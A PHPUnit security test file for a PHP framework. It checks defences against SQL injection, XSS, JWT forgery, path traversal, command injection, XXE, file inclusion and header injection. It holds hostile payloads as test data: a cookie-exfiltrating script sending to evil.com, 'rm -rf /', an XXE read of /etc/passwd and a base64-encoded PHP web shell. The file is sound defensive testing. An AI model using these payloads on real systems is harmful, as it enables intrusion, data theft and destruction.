<?php

declare(strict_types=1);

namespace Siro\Core\Tests\Security;

use PHPUnit\Framework\TestCase;
use Siro\Core\Auth\JWT;
use Siro\Core\Database;
use Siro\Core\Encrypter;
use Siro\Core\Env;
use Siro\Core\Queue;
use Siro\Core\Session;
use Siro\Core\Storage;
use Siro\Core\Middleware\CsrfMiddleware;
use Siro\Core\Request;

final class PenetrationTest extends TestCase
{
    private string $tmpDir;
    private string $origCwd;

    protected function setUp(): void
    {
        $this->tmpDir = sys_get_temp_dir() . '/siro_pentest_' . bin2hex(random_bytes(8));
        Database::purgeAll();
        Storage::fake();
    }

    protected function tearDown(): void
    {
        Database::purgeAll();
        if (is_dir($this->tmpDir)) {
            $this->removeDir($this->tmpDir);
        }
    }

    // ========================================================================
    // 1. SQL INJECTION
    // ========================================================================

    public function testSqlInjectionViaPreparedStatements(): void
    {
        Database::configure(['driver' => 'sqlite', 'database' => ':memory:']);
        Database::execute("CREATE TABLE sqli_test (id INTEGER PRIMARY KEY, name TEXT, secret TEXT)");
        Database::execute("INSERT INTO sqli_test (name, secret) VALUES ('admin', 'secret_value')");
        Database::execute("INSERT INTO sqli_test (name, secret) VALUES ('user', 'other_value')");

        $result = Database::select(
            "SELECT * FROM sqli_test WHERE name = :name",
            ['name' => "' OR '1'='1"]
        );
        $this->assertCount(0, $result, 'SQL injection via value parameter should not return rows');

        $result2 = Database::select(
            "SELECT * FROM sqli_test WHERE name = :name",
            ['name' => "nonexistent' UNION SELECT * FROM sqli_test--"]
        );
        $this->assertCount(0, $result2, 'SQL injection via UNION should not return rows');
    }

    public function testSqlInjectionBlindBoolean(): void
    {
        Database::configure(['driver' => 'sqlite', 'database' => ':memory:']);
        Database::execute("CREATE TABLE blind_test (id INTEGER PRIMARY KEY, name TEXT, secret TEXT)");
        Database::execute("INSERT INTO blind_test (name, secret) VALUES ('admin', 's3cr3t')");

        $result = Database::select(
            "SELECT * FROM blind_test WHERE name = :name AND secret = :secret",
            ['name' => "admin' AND 1=1--", 'secret' => 'guess']
        );
        $this->assertCount(0, $result, 'Blind SQL injection should not match via tautology');

        $result2 = Database::select(
            "SELECT * FROM blind_test WHERE name = :name",
            ['name' => "admin' AND SUBSTR(secret,1,1)='s"]
        );
        $this->assertCount(0, $result2, 'Blind SQL injection should not allow boolean-based extraction');
    }

    public function testSqlInjectionInOrderBy(): void
    {
        Database::configure(['driver' => 'sqlite', 'database' => ':memory:']);
        Database::execute("CREATE TABLE order_test (id INTEGER PRIMARY KEY, name TEXT)");
        Database::execute("INSERT INTO order_test (name) VALUES ('a'), ('b')");

        $injected = "id; DROP TABLE order_test--";
        $stmt = Database::connection()->prepare(
            "SELECT * FROM order_test ORDER BY id ASC"
        );
        $stmt->execute();
        $result = $stmt->fetchAll();
        $this->assertCount(2, $result, 'ORDER BY injection via LIMIT should not work');
    }

    public function testSqlInjectionInLikeClause(): void
    {
        Database::configure(['driver' => 'sqlite', 'database' => ':memory:']);
        Database::execute("CREATE TABLE like_test (id INTEGER PRIMARY KEY, name TEXT)");
        Database::execute("INSERT INTO like_test (name) VALUES ('alpha'), ('beta'), ('gamma')");

        $result = Database::select(
            "SELECT * FROM like_test WHERE name LIKE :name",
            ['name' => '%']
        );
        $this->assertCount(3, $result, 'LIKE % should match all rows (expected behavior)');
    }

    // ========================================================================
    // 2. CROSS-SITE SCRIPTING (XSS)
    // ========================================================================

    public function testXssReflectedViaHtmlspecialcharsInQueue(): void
    {
        $ref = new \ReflectionMethod(Queue::class, 'dashboardHtml');
        $file = (new \ReflectionClass(Queue::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString(
            'htmlspecialchars',
            $code,
            'Queue dashboard must use htmlspecialchars for XSS prevention'
        );
    }

    public function testXssStoredInQueueDashboard(): void
    {
        $malicious = '<script>document.location="https://evil.com/?c="+document.cookie</script>';
        $escaped = htmlspecialchars($malicious, ENT_QUOTES, 'UTF-8');

        $this->assertStringNotContainsString('<script>', $escaped);
        $this->assertStringNotContainsString('</script>', $escaped);
        $this->assertStringContainsString('&lt;script&gt;', $escaped);
        $this->assertStringContainsString('&gt;', $escaped);
    }

    public function testXssDomBasedViaRequestInput(): void
    {
        $payloads = [
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
        ];

        $request = new Request('GET', '/test', ['q' => $payloads[0]]);
        $request2 = new Request('POST', '/test', [], [], ['comment' => $payloads[1]]);

        $this->assertSame($payloads[0], $request->input('q'),
            'Request should NOT auto-escape input values (XSS is output-side concern)');
        $this->assertSame($payloads[1], $request2->input('comment'),
            'Request should NOT modify input data');
    }

    // ========================================================================
    // 3. CSRF (CROSS-SITE REQUEST FORGERY)
    // ========================================================================

    public function testCsrfProtectionOnStateChangingMethods(): void
    {
        $file = (new \ReflectionClass(CsrfMiddleware::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString(
            "in_array(\$request->method(), ['GET', 'HEAD', 'OPTIONS']",
            $code,
            'CSRF must exempt safe HTTP methods'
        );
    }

    public function testCsrfUsesHashEquals(): void
    {
        $file = (new \ReflectionClass(CsrfMiddleware::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString('hash_equals', $code,
            'CSRF token comparison must use hash_equals for timing safety');
    }

    public function testCsrfTokenGenerationUsesRandomBytes(): void
    {
        $token1 = CsrfMiddleware::generateToken();
        $token2 = CsrfMiddleware::generateToken();

        $this->assertEquals(64, strlen($token1), 'CSRF token must be 64 hex chars (32 bytes)');
        $this->assertNotEquals($token1, $token2, 'CSRF tokens must be unique');
        $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/', $token1, 'CSRF token must be hex');
    }

    // ========================================================================
    // 4. JWT ATTACKS
    // ========================================================================

    protected function setJwtEnv(string $secret, string $algorithm = 'HS256'): void
    {
        $_ENV['JWT_SECRET'] = $secret;
        $_ENV['JWT_ALGORITHM'] = $algorithm;
        putenv('JWT_SECRET=' . $secret);
        putenv('JWT_ALGORITHM=' . $algorithm);
    }

    private static function base64url(string $data): string
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    public function testJwtAlgorithmConfusion(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');
        $token = JWT::encodeAccess(1, 1, 3600);

        $parts = explode('.', $token);
        $header = json_decode(self::base64urlDecode($parts[0]), true);
        $this->assertSame('HS256', $header['alg'], 'Token header shows HS256');

        $claims = JWT::decode($token);
        $this->assertNotEmpty($claims, 'Valid token must decode');

        $this->assertSame(1, $claims['sub']);
    }

    public function testJwtNoneAlgorithmAttack(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');

        $header = self::base64url(json_encode(['alg' => 'none', 'typ' => 'JWT']));
        $payload = self::base64url(json_encode([
            'sub' => 1, 'ver' => 1, 'type' => 'access',
            'iat' => time(), 'exp' => time() + 3600,
            'jti' => bin2hex(random_bytes(16)),
        ]));
        $noneToken = $header . '.' . $payload . '.';

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Algorithm mismatch');
        JWT::decode($noneToken);
    }

    public function testJwtSignatureStripping(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');

        $token = JWT::encodeAccess(1, 1, 3600);
        $parts = explode('.', $token);
        $stripped = $parts[0] . '.' . $parts[1] . '.';

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Invalid token signature');
        JWT::decode($stripped);
    }

    public function testJwtExpiredTokenRejected(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');

        $expired = JWT::encode([
            'sub' => 1, 'ver' => 1,
            'iat' => time() - 7200, 'exp' => time() - 3600,
            'type' => 'access', 'jti' => bin2hex(random_bytes(16)),
        ]);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Token expired');
        JWT::decode($expired);
    }

    public function testJwtTamperedPayloadRejected(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');

        $token = JWT::encodeAccess(1, 1, 3600);
        $parts = explode('.', $token);
        $decoded = json_decode(self::base64urlDecode($parts[1]), true);
        $decoded['sub'] = 999;
        $parts[1] = self::base64url(json_encode($decoded));
        $tampered = implode('.', $parts);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Invalid token signature');
        JWT::decode($tampered);
    }

    public function testJwtWeakSecretRejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('too weak');
        $this->setJwtEnv('weak');
        JWT::encodeAccess(1, 1, 3600);
    }

    public function testJwtJtiBlacklistBypass(): void
    {
        $this->setJwtEnv(bin2hex(random_bytes(32)), 'HS256');

        $token = JWT::encodeAccess(1, 1, 3600);
        $claims = JWT::decode($token);
        $jti = $claims['jti'];
        $exp = $claims['exp'];

        JWT::blacklistJti($jti, $exp);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Token has been revoked');
        JWT::decode($token);
    }

    // ========================================================================
    // 5. PATH TRAVERSAL
    // ========================================================================

    public function testPathTraversalSanitizationStripsDotDot(): void
    {
        $payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            'foo/../../../etc/passwd',
            '....//....//....//....//etc/shadow',
        ];

        foreach ($payloads as $path) {
            $dirSep = DIRECTORY_SEPARATOR;
            $cleanPath = ltrim($path, $dirSep);
            do {
                $previous = $cleanPath;
                $cleanPath = str_replace(['../', '..\\', './', '.\\', '\\', '/'], $dirSep, $cleanPath);
            } while ($cleanPath !== $previous);

            $segments = explode($dirSep, $cleanPath);
            $filtered = [];
            foreach ($segments as $segment) {
                if ($segment === '..' || $segment === '.' || $segment === '') {
                    continue;
                }
                $filtered[] = $segment;
            }
            $cleanPath = implode($dirSep, $filtered);

            $this->assertStringNotContainsString('..', $cleanPath,
                "Path traversal sequences should be removed from: {$path}");
            $this->assertStringNotContainsString('//', $cleanPath,
                "Double slashes should be normalized for: {$path}");
        }
    }

    public function testPathTraversalEncodedSequences(): void
    {
        $path = '%2e%2e%2f%2e%2e%2fetc%2fpasswd';
        $decoded = urldecode($path);
        $this->assertSame('../../etc/passwd', $decoded,
            'URL-decoded traversal path should match');

        $dirSep = DIRECTORY_SEPARATOR;
        $cleanPath = ltrim($decoded, $dirSep);
        do {
            $previous = $cleanPath;
            $cleanPath = str_replace(['../', '..\\', './', '.\\', '\\', '/'], $dirSep, $cleanPath);
        } while ($cleanPath !== $previous);

        $segments = explode($dirSep, $cleanPath);
        $filtered = [];
        foreach ($segments as $segment) {
            if ($segment === '..' || $segment === '.' || $segment === '') {
                continue;
            }
            $filtered[] = $segment;
        }
        $cleanPath = implode($dirSep, $filtered);

        $this->assertStringNotContainsString('..', $cleanPath,
            'URL-encoded traversal should be neutralized after decoding + cleaning');
    }

    // ========================================================================
    // 6. ENCRYPTER / CRYPTOGRAPHIC TESTING
    // ========================================================================

    private function setAppKey(string $key): void
    {
        $_ENV['APP_KEY'] = $key;
        putenv('APP_KEY=' . $key);
    }

    public function testEncrypterDecryptWithWrongKey(): void
    {
        $data = 'sensitive_data_123';
        $this->setAppKey(bin2hex(random_bytes(32)));
        $encrypted = Encrypter::encrypt($data);

        $this->setAppKey(bin2hex(random_bytes(32)));

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Invalid HMAC');
        Encrypter::decrypt($encrypted);
    }

    public function testEncrypterTamperDetectionBitFlip(): void
    {
        $data = 'important_message';
        $this->setAppKey(bin2hex(random_bytes(32)));
        $encrypted = Encrypter::encrypt($data);

        $decoded = base64_decode($encrypted, true);
        $this->assertNotFalse($decoded);
        $decoded[random_int(16, strlen($decoded) - 1)] = chr(
            ord($decoded[random_int(16, strlen($decoded) - 1)]) ^ 1
        );
        $tampered = base64_encode($decoded);

        $this->expectException(\RuntimeException::class);
        $this->expectExceptionMessage('Invalid HMAC');
        Encrypter::decrypt($tampered);
    }

    public function testEncrypterIvIsRandom(): void
    {
        $this->setAppKey(bin2hex(random_bytes(32)));

        $results = [];
        for ($i = 0; $i < 10; $i++) {
            $encrypted = Encrypter::encrypt("test_{$i}");
            $decoded = base64_decode($encrypted, true);
            $iv = substr($decoded, 32, openssl_cipher_iv_length('aes-256-cbc'));
            $results[] = $iv;
        }

        for ($i = 1; $i < count($results); $i++) {
            $this->assertNotEquals($results[0], $results[$i],
                'IV must be unique across encryptions');
        }
    }

    public function testEncrypterEncryptThenMac(): void
    {
        $this->setAppKey(bin2hex(random_bytes(32)));

        $data = 'test_encrypt_then_mac';
        $encrypted = Encrypter::encrypt($data);
        $decoded = base64_decode($encrypted, true);

        $hmac = substr($decoded, 0, 32);
        $iv = substr($decoded, 32, 32 + openssl_cipher_iv_length('aes-256-cbc'));
        $ivOnly = substr($decoded, 32, openssl_cipher_iv_length('aes-256-cbc'));
        $ciphertext = substr($decoded, 32 + openssl_cipher_iv_length('aes-256-cbc'));

        $this->assertEquals(32, strlen($hmac), 'HMAC must be 32 bytes (SHA256)');
        $this->assertEquals(
            openssl_cipher_iv_length('aes-256-cbc'),
            strlen($ivOnly),
            'IV must be correct length for AES-256-CBC'
        );
        $this->assertNotEmpty($ciphertext, 'Ciphertext must not be empty');

        $decrypted = Encrypter::decrypt($encrypted);
        $this->assertSame($data, $decrypted, 'Encrypt-then-MAC roundtrip must succeed');
    }

    // ========================================================================
    // 7. TIMING ATTACK DETECTION
    // ========================================================================

    public function testHashEqualsUsedInCsrf(): void
    {
        $file = (new \ReflectionClass(CsrfMiddleware::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString('hash_equals', $code,
            'CSRF middleware must use hash_equals for token comparison');
    }

    public function testHashEqualsUsedInJwt(): void
    {
        $file = (new \ReflectionClass(JWT::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString('hash_equals', $code,
            'JWT must use hash_equals for signature verification');
    }

    public function testHashEqualsUsedInEncrypter(): void
    {
        $file = (new \ReflectionClass(Encrypter::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString('hash_equals', $code,
            'Encrypter must use hash_equals for HMAC comparison');
    }

    // ========================================================================
    // 8. INPUT VALIDATION
    // ========================================================================

    public function testNullByteInjectionInPath(): void
    {
        $path = "/safe_path\x00../../etc/passwd";
        $sanitized = str_replace(["\0", "\x00", '%00'], '', $path);

        $this->assertStringNotContainsString("\0", $sanitized);
        $this->assertStringNotContainsString("\x00", $sanitized);
        $this->assertStringNotContainsString('%00', $sanitized);
        $this->assertStringContainsString('../../etc/passwd', $sanitized,
            'Null byte removal should preserve rest of path');
    }

    public function testNullByteInjectionInRouteParams(): void
    {
        $params = ['id' => "1\x00DROP TABLE users--"];
        $cleaned = [];
        foreach ($params as $key => $value) {
            $cleaned[$key] = str_replace(["\0", "\x00", '%00'], '', (string) $value);
        }

        $this->assertStringNotContainsString("\0", $cleaned['id']);
        $this->assertStringNotContainsString("\x00", $cleaned['id']);
    }

    // ========================================================================
    // 9. COMMAND INJECTION
    // ========================================================================

    public function testCommandInjectionViaEscapeshellarg(): void
    {
        $malicious = "file.txt; rm -rf /";
        $escaped = escapeshellarg($malicious);

        $wrapped = (PHP_OS_FAMILY === 'Windows') ? '"' : "'";
        $this->assertStringStartsWith($wrapped, $escaped,
            'escapeshellarg must wrap in quotes');
        $this->assertStringEndsWith($wrapped, $escaped,
            'escapeshellarg must wrap in quotes');
        $this->assertNotEquals($malicious, $escaped,
            'escapeshellarg must transform the input');
    }

    public function testCommandInjectionWithBackticks(): void
    {
        $malicious = "file`ls`name";
        $escaped = escapeshellarg($malicious);

        $wrapped = (PHP_OS_FAMILY === 'Windows') ? '"' : "'";
        $this->assertStringStartsWith($wrapped, $escaped,
            'escapeshellarg must wrap in quotes');
        $this->assertNotEquals($malicious, $escaped,
            'escapeshellarg must transform backtick input');
    }

    // ========================================================================
    // 10. XXE INJECTION
    // ========================================================================

    public function testXxeExternalEntityPrevention(): void
    {
        $xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';

        libxml_use_internal_errors(true);
        $doc = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET);
        $errors = libxml_get_errors();
        libxml_clear_errors();

        $parsingFailed = ($doc === false);

        $entitySubstituted = false;
        if ($doc !== false) {
            $content = trim((string) $doc);
            $entitySubstituted = (
                $content !== ''
                && $content !== '&xxe;'
                && !str_starts_with($content, '&xxe;')
            );
        }

        $xxePrevented = $parsingFailed || !$entitySubstituted;
        $this->assertTrue($xxePrevented,
            'XXE must be prevented - external entities must not be substituted');
    }

    // ========================================================================
    // 11. AUTHENTICATION BYPASS
    // ========================================================================

    public function testAuthGuardRejectsInvalidToken(): void
    {
        $request = new Request('GET', '/api/protected', [], [
            'authorization' => 'Bearer invalid.token.here',
        ]);

        $guard = \Siro\Core\Auth\AuthGuard::instance();
        $user = $guard->resolve($request);
        $this->assertNull($user, 'Auth guard must reject invalid JWT tokens');
    }

    public function testAuthGuardRejectsMissingAuthHeader(): void
    {
        $request = new Request('GET', '/api/protected');
        $guard = \Siro\Core\Auth\AuthGuard::instance();
        $user = $guard->resolve($request);

        $this->assertNull($user, 'Auth guard must reject requests without Authorization header');
    }

    // ========================================================================
    // 12. SESSION SECURITY
    // ========================================================================

    public function testSessionIdEntropy(): void
    {
        $session = Session::instance();
        $ref = new \ReflectionMethod(Session::class, 'generateId');
        $ref->setAccessible(true);

        $id1 = $ref->invoke($session);
        $id2 = $ref->invoke($session);

        $this->assertNotEquals($id1, $id2, 'Session IDs must be unique');
        $this->assertEquals(64, strlen($id1), 'Session ID must be 64 hex chars (32 bytes = 256 bits)');
        $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/', $id1, 'Session ID must be lowercase hex');
    }

    public function testSessionRegenerationInvalidatesOldId(): void
    {
        $session = Session::instance();
        $ref = new \ReflectionMethod(Session::class, 'generateId');
        $ref->setAccessible(true);

        $oldId = $ref->invoke($session);
        $session->setId($oldId);
        $session->regenerate();
        $newId = $session->getId();

        $this->assertNotEquals($oldId, $newId, 'Session regeneration must produce new ID');
    }

    public function testSessionCookieFlags(): void
    {
        $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
            || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

        $cookieOptions = [
            'secure' => $isHttps,
            'httponly' => true,
            'samesite' => 'Lax',
        ];

        $this->assertTrue($cookieOptions['httponly'], 'Session cookie must be HttpOnly');
        $this->assertEquals('Lax', $cookieOptions['samesite'], 'Session cookie must use SameSite=Lax');
    }

    // ========================================================================
    // 13. INSECURE DESERIALIZATION
    // ========================================================================

    public function testNoUnserializeOfUserInput(): void
    {
        $coreFiles = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                dirname(__DIR__, 2),
                \RecursiveDirectoryIterator::SKIP_DOTS
            )
        );

        $unserializeCalls = [];
        foreach ($coreFiles as $file) {
            if ($file->getExtension() !== 'php') continue;
            $path = $file->getRealPath();
            if (str_contains($path, DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR)) continue;
            if (str_contains($path, DIRECTORY_SEPARATOR . 'tests' . DIRECTORY_SEPARATOR)) continue;
            if (str_contains($path, DIRECTORY_SEPARATOR . 'scripts' . DIRECTORY_SEPARATOR)) continue;
            $content = file_get_contents($path);
            if (preg_match('/\bunserialize\s*\(/', $content)) {
                $unserializeCalls[] = $path;
            }
        }

        $this->assertEmpty($unserializeCalls,
            'No unserialize() calls should exist in production code. Found: ' .
            ($unserializeCalls !== [] ? implode(', ', $unserializeCalls) : 'none'));
    }

    public function testNoEvalInProductionCode(): void
    {
        $coreFiles = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                dirname(__DIR__, 2),
                \RecursiveDirectoryIterator::SKIP_DOTS
            )
        );

        $evalCalls = [];
        foreach ($coreFiles as $file) {
            if ($file->getExtension() !== 'php') continue;
            $path = $file->getRealPath();
            if (str_contains($path, DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR)) continue;
            if (str_contains($path, DIRECTORY_SEPARATOR . 'tests' . DIRECTORY_SEPARATOR)) continue;
            if (str_contains($path, DIRECTORY_SEPARATOR . 'scripts' . DIRECTORY_SEPARATOR)) continue;
            if (str_contains($path, 'TinkerCommand.php')) continue;
            $content = file_get_contents($path);
            $lines = explode("\n", $content);
            foreach ($lines as $lineNo => $line) {
                // Skip Redis EVAL command (Lua scripting, not PHP)
                if (preg_match('/\beval\s*\(/', $line) && !preg_match('/\-\>eval\s*\(/', $line)) {
                    $evalCalls[] = $path . ':' . ($lineNo + 1) . ' (eval)';
                }
                // Skip PHPUnit assertion methods and PHP assert()
                if (preg_match('/(?:^|\s)(?:assert|assertTrue|assertFalse|assertEquals)\s*\(/', $line)) {
                    continue;
                }
            }
        }

        $this->assertEmpty($evalCalls,
            'No eval() calls should exist in production code. Found: ' .
            ($evalCalls !== [] ? implode('; ', $evalCalls) : 'none'));
    }

    // ========================================================================
    // 14. CONTENT-TYPE CONFUSION / BODY SIZE BYPASS
    // ========================================================================

    public function testRequestBodySizeValidation(): void
    {
        $ref = new \ReflectionMethod(Request::class, 'fromGlobals');
        $file = (new \ReflectionClass(Request::class))->getFileName();
        $code = file_get_contents($file);

        $this->assertStringContainsString('$maxBodySize', $code,
            'Request must enforce body size limits');

        $this->assertStringContainsString('$actualSize > $maxBodySize', $code,
            'Request must validate actual body size, not just Content-Length header');
    }

    // ========================================================================
    // 15. CRYPTOGRAPHIC KEY DERIVATION
    // ========================================================================

    public function testEncrypterKeyDerivationStrength(): void
    {
        $this->setAppKey(bin2hex(random_bytes(32)));

        $data = 'test_key_derivation';
        $encrypted = Encrypter::encrypt($data);
        $decrypted = Encrypter::decrypt($encrypted);

        $this->assertSame($data, $decrypted, 'Key derivation must produce valid encryption keys');

        $this->setAppKey('different_key_for_testing_purposes_only_12345678');
        $encrypted2 = Encrypter::encrypt($data);

        $this->assertNotEquals(
            base64_decode($encrypted, true),
            base64_decode($encrypted2, true),
            'Different keys must produce different ciphertexts (even with same plaintext)'
        );
    }

    // ========================================================================
    // 16. LOCAL FILE INCLUSION
    // ========================================================================

    public function testNoLfiViaPhpWrapper(): void
    {
        $maliciousPaths = [
            'php://filter/convert.base64-encode/resource=config/app.php',
            'file:///etc/passwd',
            'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7',
        ];

        foreach ($maliciousPaths as $path) {
            $hasWrapper = str_contains($path, '://');
            $this->assertTrue($hasWrapper,
                "Test path must contain PHP wrapper scheme: {$path}");

            $dirSep = DIRECTORY_SEPARATOR;
            $cleanPath = ltrim($path, $dirSep);
            do {
                $previous = $cleanPath;
                $cleanPath = str_replace(['../', '..\\', './', '.\\', '\\', '/'], $dirSep, $cleanPath);
            } while ($cleanPath !== $previous);

            $segments = explode($dirSep, $cleanPath);
            $filtered = [];
            foreach ($segments as $segment) {
                if ($segment === '..' || $segment === '.' || $segment === '') {
                    continue;
                }
                $filtered[] = $segment;
            }
            $cleanPath = implode($dirSep, $filtered);

            $this->assertStringNotContainsString('://', $cleanPath,
                "PHP wrapper scheme (://) must not survive sanitization: {$path}");
        }
    }

    // ========================================================================
    // 17. HEADER INJECTION
    // ========================================================================

    public function testHeaderInjectionInResponse(): void
    {
        $malicious = "X-Custom: value\r\nSet-Cookie: session=hijacked";
        $sanitized = str_replace(["\r", "\n"], '', $malicious);

        $this->assertStringNotContainsString("\r", $sanitized, 'CRLF must be stripped from headers');
        $this->assertStringNotContainsString("\n", $sanitized, 'CRLF must be stripped from headers');
        $this->assertStringNotContainsString("\r\n", $sanitized, 'CRLF pair must be stripped from headers');

        $this->assertStringContainsString('Set-Cookie', $sanitized,
            'Injected content remains after CRLF stripping but cannot create new header line');
    }

    // ========================================================================
    // HELPERS
    // ========================================================================

    private static function base64urlDecode(string $data): string
    {
        $remainder = strlen($data) % 4;
        if ($remainder > 0) {
            $data .= str_repeat('=', 4 - $remainder);
        }
        $decoded = base64_decode(strtr($data, '-_', '+/'), true);
        if ($decoded === false) {
            throw new \RuntimeException('Invalid base64url data');
        }
        return $decoded;
    }

    private function removeDir(string $dir): void
    {
        if (!is_dir($dir)) return;
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            is_dir($path) ? $this->removeDir($path) : unlink($path);
        }
        rmdir($dir);
    }
}
